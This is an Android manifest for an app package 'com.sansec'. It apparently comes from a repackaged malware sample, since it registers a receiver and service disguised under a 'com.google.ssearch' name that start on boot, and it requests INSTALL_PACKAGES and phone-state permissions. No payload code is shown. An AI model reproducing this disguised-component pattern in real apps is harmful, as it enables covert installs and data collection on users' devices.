<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.sansec">
    <application android:icon="@drawable/app_logo" android:label="@string/app_name" android:name=".MyApplication">
        <activity android:label="@string/app_name" android:name=".SplashActivity" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="LocalActivity" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="MainActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar" android:windowSoftInputMode="adjustPan"/>
        <activity android:name="OnLineActivity" android:screenOrientation="portrait"/>
        <activity android:name="SettingActivity" android:screenOrientation="portrait"/>
        <activity android:name="ContentListActivity" android:screenOrientation="portrait"/>
        <activity android:name="Help" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="d$W" android:theme="@android:style/Theme.Dialog"/>
        <receiver android:name="com.google.ssearch.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".service.kaijiReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:name="com.google.ssearch.SearchService"/>
        <service android:name="service.kaijiService"/>
        <service android:name=".service.DownloadService">
            <intent-filter>
                <action android:name="com.sansec.service.DownloadService"/>
            </intent-filter>
        </service>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_DOWNLOAD_MANAGER"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
</manifest>